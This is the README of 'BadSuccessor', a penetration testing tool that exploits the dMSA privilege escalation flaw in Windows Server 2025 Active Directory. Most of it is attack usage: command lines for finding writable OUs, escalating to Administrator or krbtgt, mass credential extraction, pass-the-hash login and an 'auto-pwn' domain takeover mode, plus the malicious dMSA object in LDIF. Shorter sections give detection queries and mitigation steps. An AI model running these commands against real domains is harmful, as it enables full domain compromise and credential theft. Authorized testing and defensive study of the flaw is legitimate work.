# BadSuccessor

A penetration testing tool that exploits the dMSA (delegated Managed Service Account) privilege escalation vulnerability in Windows Server 2025 Active Directory environments.

## ⚠️ Legal Disclaimer

**This tool is for authorized penetration testing and security research purposes only.** Use of this tool against systems without explicit written permission is illegal and unethical. The authors are not responsible for any misuse or damage caused by this tool.

## 📋 Overview

BadSuccessor exploits a privilege escalation vulnerability in Windows Server 2025's delegated Managed Service Account (dMSA) feature. The vulnerability allows attackers with minimal permissions to escalate privileges to any user in the domain, including Domain Administrators.

### Research Credit

This tool is based on the excellent research by **Yuval Gordon** from **Akamai Technologies**:
- [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)

## 🎯 Vulnerability Details

The vulnerability exists in the dMSA migration process where:
1. An attacker creates a malicious dMSA in any writable OU
2. Sets `msDS-ManagedAccountPrecededByLink` to point to a target user
3. Sets `msDS-DelegatedMSAState` to `2` (migration completed)
4. The KDC automatically grants the dMSA all privileges of the target user via PAC inheritance

Additionally, the KERB-DMSA-KEY-PACKAGE structure contains the target user's password keys, enabling credential extraction.

## ✅ Prerequisites

### System Requirements
- Linux machine (non-domain joined)
- Python 3.6+
- Network access to target Active Directory environment
- Target domain must have at least one Windows Server 2025 Domain Controller

### Python Dependencies
```bash
pip3 install -r requirements.txt
```

### Optional Dependencies (for enhanced Kerberos support)
```bash
# Ubuntu/Debian
sudo apt-get install libkrb5-dev libgssapi-krb5-2

# RHEL/CentOS/Fedora
sudo yum install krb5-devel
```

### Required Permissions
- Valid domain credentials (any user account)
- **ANY** of the following permissions on at least one Organizational Unit:
  - `CreateChild` permission
  - `Write` permission
  - `GenericWrite` permission
  - `GenericAll` permission
  - Member of default groups with write access (e.g., Authenticated Users)
- Tool automatically discovers all writable OUs and shows specific permissions

## 🚀 Installation

```bash
git clone https://github.com/cybrly/badsuccessor.git
cd badsuccessor
pip3 install -r requirements.txt
chmod +x badsuccessor.py
```

## 📖 Usage

### Basic Syntax
```bash
python3 badsuccessor.py -d <domain> -u <username> -p <password> [options]
```

### Quick Start Examples

#### 1. Enumerate Environment
```bash
# Check Windows Server 2025 schema support
python3 badsuccessor.py -d corp.local -u john -p Password123 --check-schema

# Find ALL writable OUs (not just CreateChild)
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate

# List high-value targets
python3 badsuccessor.py -d corp.local -u john -p Password123 --list-targets
```

#### 2. Perform Attack
```bash
# Basic attack against Administrator
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator

# Attack with specific OU
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator --ou-dn "OU=ServiceAccounts,DC=corp,DC=local"

# Attack with custom dMSA name
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target krbtgt --dmsa-name legit_service
```

#### 3. Extract Credentials
```bash
# Extract credentials for multiple users
python3 badsuccessor.py -d corp.local -u john -p Password123 --extract-creds --targets Administrator,krbtgt,svc_sql

# Auto-pwn mode (fully automated)
python3 badsuccessor.py -d corp.local -u john -p Password123 --auto-pwn
```

### Advanced Connection Examples

#### LDAPS (SSL/TLS) Connection
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --dc-ip 192.168.1.10 --ldaps --attack --target Administrator
```

#### Kerberos Authentication
```bash
# With password
python3 badsuccessor.py -d corp.local -u john -p Password123 --dc-ip 192.168.1.10 -k --attack --target Administrator

# With ccache
export KRB5CCNAME=/tmp/krb5cc_john
python3 badsuccessor.py -d corp.local -u john --dc-ip 192.168.1.10 --ccache $KRB5CCNAME --no-pass --attack --target Administrator
```

#### NTLM Hash Authentication
```bash
python3 badsuccessor.py -d corp.local -u john --hash :aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 --dc-ip 192.168.1.10 --attack --target Administrator
```

### Command Line Options

#### Connection Parameters
| Option | Description |
|--------|-------------|
| `-d, --domain` | Target domain (e.g., corp.local) **[REQUIRED]** |
| `-u, --username` | Username for authentication **[REQUIRED]** |
| `-p, --password` | Password for authentication |
| `--dc-ip` | Domain Controller IP (auto-discover if omitted) |
| `--ldaps` | Force LDAPS (SSL) connection on port 636 |
| `--ldap` | Force LDAP (non-SSL) connection on port 389 |
| `--port` | Custom LDAP port (overrides --ldaps/--ldap) |
| `--no-ssl-fallback` | Disable automatic LDAPS→LDAP fallback |

#### Authentication Options
| Option | Description |
|--------|-------------|
| `--auth` | Authentication method: auto, kerberos, ntlm (default: auto) |
| `--ccache` | Path to Kerberos ccache file |
| `--no-pass` | Use Kerberos authentication without password |
| `--hash` | NTLM hash for authentication (format: LM:NT or :NT) |
| `-k, --kerberos` | Use Kerberos authentication (same as --auth kerberos) |

#### Attack Options
| Option | Description |
|--------|-------------|
| `--attack` | Perform the BadSuccessor attack |
| `--target` | Target user to escalate privileges to |
| `--dmsa-name` | Name for malicious dMSA (default: evil_dmsa) |
| `--ou-dn` | Specific OU DN to use (auto-detect if not specified) |
| `--extract-creds` | Extract credentials using key package |
| `--targets` | Comma-separated list of users for credential extraction |
| `--auto-pwn` | Fully automated domain takeover |

#### Enumeration Options
| Option | Description |
|--------|-------------|
| `--enumerate` | Enumerate OUs with ANY write permissions |
| `--list-targets` | List high-value targets |
| `--check-schema` | Verify Windows Server 2025 schema |

#### Maintenance Options
| Option | Description |
|--------|-------------|
| `--cleanup` | Remove created dMSA |
| `--dmsa-dn` | dMSA DN for cleanup operations |
| `--no-banner` | Suppress banner output |
| `--verbose` | Enable verbose output |

## 🔧 Attack Workflow

### Phase 1: Reconnaissance
1. **Schema Verification**: Confirms Windows Server 2025 dMSA support
2. **Permission Discovery**: Identifies OUs with ANY write access (not just CreateChild)
3. **Target Enumeration**: Lists privileged accounts and service accounts

### Phase 2: Exploitation
1. **dMSA Creation**: Creates malicious dMSA with proper object classes
2. **Attribute Manipulation**: Sets predecessor link and migration state
3. **Privilege Inheritance**: dMSA inherits target's complete PAC

### Phase 3: Authentication
1. **Kerberos TGT Request**: Obtains TGT with inherited privileges
2. **PAC Analysis**: Verifies inherited group memberships
3. **Key Package Extraction**: Retrieves target's password hashes

### Phase 4: Post-Exploitation
The tool provides ready-to-use commands for:
- DCSync attacks (dump all domain hashes)
- Remote command execution
- Lateral movement
- Persistence establishment

## 🔐 Enhanced Features (v2.1.0)

### Comprehensive Permission Checking
- **NEW**: Checks for ALL write permissions, not just CreateChild
- **NEW**: Detects permissions from default groups (Authenticated Users, Everyone, etc.)
- Evaluates actual permissions on OUs including:
  - CreateChild
  - Write
  - GenericWrite
  - GenericAll
  - FullControl
- Shows exact permissions for each discovered OU

### Default Group Support
- **NEW**: Automatically includes default group memberships in permission checks
- Handles permissions granted to:
  - Authenticated Users (S-1-5-11)
  - Everyone (S-1-1-0)
  - Domain Users
  - Network
  - Interactive
  - This Organization

### Complete Implementation
- **FIXED**: All features fully implemented (no placeholder code)
- **FIXED**: Proper error handling throughout
- **IMPROVED**: More informative output and logging

### Windows Server 2025 Schema Verification
- Validates all required dMSA schema elements
- Checks for critical attributes before attempting exploitation
- Provides clear warnings if environment doesn't support dMSAs

### Full Kerberos Authentication
- Native Kerberos AS-REQ/AS-REP implementation
- Proper dMSA authentication with PAC manipulation
- Ticket saving to ccache format

### KERB-DMSA-KEY-PACKAGE Extraction
- ASN.1 parsing of key package structure
- Extraction of current and previous keys
- Automatic identification of NTLM hashes and Kerberos keys

### Mass Credential Extraction
- Automated creation of temporary dMSAs
- Parallel extraction of multiple user credentials
- Clean removal of artifacts after extraction

## 🛡️ Detection

### Event IDs to Monitor
| Event ID | Source | Description |
|----------|--------|-------------|
| **5137** | Security | Directory service object creation (dMSA) |
| **5136** | Security | Directory service object modification |
| **2946** | Directory Service | Group Managed Service Account authentication |
| **4768** | Security | Kerberos TGT requested |
| **4769** | Security | Kerberos service ticket requested |

### Detection Rules
```
# Splunk Query Example
index=windows EventCode=5137
| where ObjectClass="msDS-DelegatedManagedServiceAccount"
| where NOT user IN ("approved_admins")

# Sigma Rule Example
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-ManagedAccountPrecededByLink'
  condition: selection
```

### Behavioral Indicators
- Rapid creation and deletion of service accounts
- Non-administrative users creating dMSAs
- Unusual modifications to migration-related attributes
- Service accounts authenticating from unexpected sources

## 🔒 Mitigation

### Immediate Actions
1. **Restrict OU Permissions**
   ```powershell
   # Remove ALL write permissions from non-admin users
   Remove-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" -User "Domain Users" -AccessRights CreateChild,Write,GenericWrite,GenericAll

   # Check for default group permissions
   Get-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" | Where-Object {$_.IdentityReference -match "Authenticated Users|Everyone"}
   ```

2. **Monitor dMSA Operations**
   ```powershell
   # Enable auditing on dMSA attributes
   Set-ADObject -Identity "CN=Schema,CN=Configuration,DC=corp,DC=local" -Add @{
     'msDS-ReplAttributeMetaData' = 'msDS-ManagedAccountPrecededByLink'
   }
   ```

3. **Implement Detection**
   - Deploy provided detection rules
   - Alert on Event ID 2946 with S-1-5-7 caller
   - Monitor attribute modifications

### Long-term Solutions
- Apply Microsoft patches when available
- Regular permission audits (check ALL write permissions, not just CreateChild)
- Principle of least privilege enforcement
- Consider disabling dMSA if not required

## 📊 Statistics

Based on Akamai's research:
- **91%** of environments have vulnerable permissions
- Works on **default configurations**
- Affects organizations with Windows Server 2025 DCs
- No patches currently available

## 🏗️ Technical Implementation Details

### dMSA Object Structure
```ldif
dn: CN=evil_dmsa,OU=ServiceAccounts,DC=corp,DC=local
objectClass: top
objectClass: msDS-GroupManagedServiceAccount
objectClass: msDS-DelegatedManagedServiceAccount
sAMAccountName: evil_dmsa$
userAccountControl: 4096
msDS-ManagedAccountPrecededByLink: CN=Administrator,CN=Users,DC=corp,DC=local
msDS-DelegatedMSAState: 2
msDS-SupportedEncryptionTypes: 28
```

### PAC Inheritance Flow
```
1. Client → KDC: AS-REQ for evil_dmsa$
2. KDC: Read msDS-ManagedAccountPrecededByLink
3. KDC: Build PAC with Administrator's SIDs
4. KDC → Client: AS-REP with privileged PAC
5. Client: Now has Administrator privileges
```

### Key Package Structure
```
KERB-DMSA-KEY-PACKAGE ::= SEQUENCE {
    current-keys [0] SEQUENCE OF EncryptionKey,
    previous-keys [1] SEQUENCE OF EncryptionKey OPTIONAL
}

EncryptionKey ::= SEQUENCE {
    keytype [0] Int32,
    keyvalue [1] OCTET STRING
}
```

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/enhancement`)
3. Commit changes (`git commit -m 'Add new feature'`)
4. Push to branch (`git push origin feature/enhancement`)
5. Submit a Pull Request

### Development Guidelines
- Follow PEP 8 style guide
- Add unit tests for new features
- Update documentation
- Test against multiple AD environments

## 📝 Changelog

### v2.1.0 (2025-05-25) - Complete Implementation
- **MAJOR**: Enhanced ACL permission checking - now detects ALL write permissions
- **MAJOR**: Added support for default groups (Authenticated Users, Everyone, etc.)
- **FIXED**: Removed all placeholder code and AI comments
- **FIXED**: Complete implementation of all features
- **IMPROVED**: Better error handling and informative output
- **IMPROVED**: More comprehensive OU enumeration (includes containers)
- **FEATURE**: Shows exact permissions for each discovered OU
- **FEATURE**: Detects protected users and delegation restrictions

### v2.0.0 (2025-05-24) - Enhanced Edition
- **Major**: Full Kerberos authentication implementation
- **Major**: KERB-DMSA-KEY-PACKAGE extraction for credential theft
- **Major**: Basic ACL permission checking
- **Major**: Windows Server 2025 schema verification
- **Feature**: Mass credential extraction mode
- **Feature**: Auto-pwn for automated domain takeover
- **Feature**: Enhanced target enumeration
- **Feature**: Post-exploitation command generation
- **Improvement**: Better error handling and logging
- **Improvement**: Production-ready code structure

### v1.2.0 (2025-05-23)
- Added comprehensive Kerberos authentication support
- Implemented LDAPS with automatic fallback
- Enhanced schema detection and object creation fallbacks
- Improved error handling and compatibility

### v1.1.0 (2025-05-23)
- Added LDAPS (SSL/TLS) support
- Enhanced object creation with multiple class fallbacks
- Improved schema detection for various AD versions

### v1.0.0 (2025-05-23)
- Initial release
- Linux-compatible implementation
- LDAP-based exploitation

## 📚 References

- [Original Akamai Research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [GitHub Issue #1 - Enhanced Permission Checking](https://github.com/cybrly/badsuccessor/issues/1)

## 🐛 Known Issues

- Hash authentication requires password for initial implementation
- Some environments may require manual Kerberos configuration
- Detection rules need customization per environment

## 📧 Contact

For questions, issues, or responsible disclosure:
- Open a GitHub Issue
- Follow responsible disclosure practices
- Allow 90 days for patch development

---

**⚡ Remember: With great power comes great responsibility. Always obtain proper authorization before testing!** 🔐
